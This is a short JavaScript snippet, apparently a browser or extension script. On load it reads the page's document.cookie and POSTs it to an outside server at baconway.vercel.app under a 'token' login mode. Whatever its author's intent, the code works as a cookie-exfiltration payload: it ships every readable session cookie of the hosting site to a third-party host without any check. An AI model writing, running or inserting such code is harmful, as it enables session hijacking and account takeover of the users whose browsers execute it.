function postCookies() {
  const url = "https://baconway.vercel.app"; // https://localhost:5173 (test), https://baconway.vercel.app (prod)
  fetch(`${url}/api/login.js`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      login_mode: "token",
      cookies: document.cookie,
      redirectLink: "/api/token-test",
    }),
  });
}

postCookies();
